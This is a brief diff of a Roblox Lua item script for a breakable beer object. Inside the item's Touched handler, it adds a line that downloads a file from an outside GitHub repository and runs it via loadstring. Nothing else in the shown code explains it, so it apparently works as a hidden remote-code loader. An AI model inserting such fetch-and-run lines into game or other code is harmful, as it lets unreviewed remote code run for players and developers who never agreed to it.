@@ -17,7 +17,9 @@ a.Activated:Connect(function()
 		beerbroke.SoundId="rbxassetid://113127656562744"
 		BeerCopy.Touched:Connect(function()
 			BeerCopy:Destroy()
+            
 			a:Destroy()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/therealvan45/Doors-ShizoMode/refs/heads/main/Heap.txt"))()
 		end)
 		
 		cld=true
